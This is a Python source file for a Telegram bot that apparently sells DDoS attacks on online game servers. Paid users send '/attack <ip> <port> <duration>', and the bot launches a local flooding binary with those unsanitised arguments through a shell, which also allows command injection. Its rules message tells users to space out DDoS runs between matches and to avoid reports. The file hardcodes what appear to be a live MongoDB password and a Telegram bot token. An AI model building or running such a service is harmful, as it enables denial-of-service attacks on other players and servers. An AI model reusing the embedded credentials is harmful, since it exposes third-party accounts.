import os
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Database Configuration
MONGO_URI = 'mongodb+srv://ultra:ultra@cluster0.cdzmj.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['TEST']
users_collection = db['PAID']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7622556470:AAGfiwEMlvWB3dnXcZdISOCOGHPmu99CeeU'
ADMIN_USER_ID = 6135948216  # Replace with your admin user ID
ADMIN_USERNAME = 'your_admin_username'  # Replace with your admin's Telegram username (without @)

# Customizable messages
OWNER_NAME = '@ULTRA_GAMER_OP'  # Change this to the owner's name
WELCOME_MESSAGE = (
    f"🤗 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐎𝐓⚡\n\n"
    f"𝐎𝐖𝐍𝐄𝐑 💯 {OWNER_NAME} 🔥\n\n"
    "🌏 𝐖𝐄'𝐑𝐄 𝐏𝐑𝐎𝐕𝐈𝐃𝐈𝐍𝐆 𝐀𝐑𝐄 𝐖𝐎𝐑𝐋𝐃 𝐁𝐄𝐒𝐓 𝐇𝐀𝐂𝐊𝐒 🌏"
)

RULES_MESSAGE = (
    "*📜 Bot Rules - Keep It Cool!*\n\n"
    "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
    "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
    "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
    "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
    "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
    "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
    "💡 Follow the rules and let’s enjoy gaming together!*"
)

active_attacks = {}  # To keep track of active attacks (user_id -> attack process)

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*🚫 Who goes there?* 🛑\n\n*This is a restricted area! Only authorized warriors may pass.* 💥\n*You need to be granted permission first! ⚔️*",
            parse_mode='Markdown'
        )
        return

    # Send the customizable welcome message and rules
    await context.bot.send_message(chat_id=chat_id, text=WELCOME_MESSAGE, parse_mode='Markdown')
    await context.bot.send_message(chat_id=chat_id, text=RULES_MESSAGE, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*💀 Only the mighty admin can summon new warriors!* ⚡",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 2:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Error: You must give a valid user ID and duration!*\n*Usage: /add <user_id> <time>*",
            parse_mode='Markdown'
        )
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=f"*🎉 {target_user_id} has been added as a warrior for {time_input}!*",
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚡ Only the chosen one (admin) can banish warriors!*\n*You need admin powers to remove them.*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Error: You must provide a valid user ID to remove!*",
            parse_mode='Markdown'
        )
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=f"*🚫 {target_user_id} has been banished from the battlefield!* 👑",
        parse_mode='Markdown'
    )

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await is_user_allowed(user_id):
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*🚨 Access Denied: You are not on the list of approved warriors!* ⚔️",
            parse_mode='Markdown'
        )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*⚠️ Error: To launch an attack, use the format /attack <ip> <port> <duration>*\n*Prepare yourself for war!*",
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    await context.bot.send_message(
        chat_id=chat_id, 
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {ip}:{port}*\n"
            f"*⏳ Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ), 
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
            [InlineKeyboardButton("Contact Admin", url=f"tg://user?id={ADMIN_USER_ID}")]
        ])
    )

    # Start the attack as an async task and store the process to handle stopping it
    attack_task = asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
    active_attacks[user_id] = attack_task

async def stop_attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id not in active_attacks:
        await update.callback_query.answer("You don't have an active attack to stop!")
        return

    # Stop the active attack
    attack_task = active_attacks.pop(user_id)
    attack_task.cancel()

    await update.callback_query.answer("The attack has been halted! 🛑")

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ultra {ip} {port} {duration} 100",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id, 
            text=f"*⚠️ Error during the attack: {str(e)}*",
            parse_mode='Markdown'
        )

    finally:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*💥 Attack Complete! 💥*\n*The enemy has been defeated, thanks to your bravery!* ⚔️\n*Thank you for your service, warrior!*",
            parse_mode='Markdown'
        )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CallbackQueryHandler(stop_attack, pattern="stop_attack"))

    application.run_polling()

if __name__ == '__main__':
    main()
    
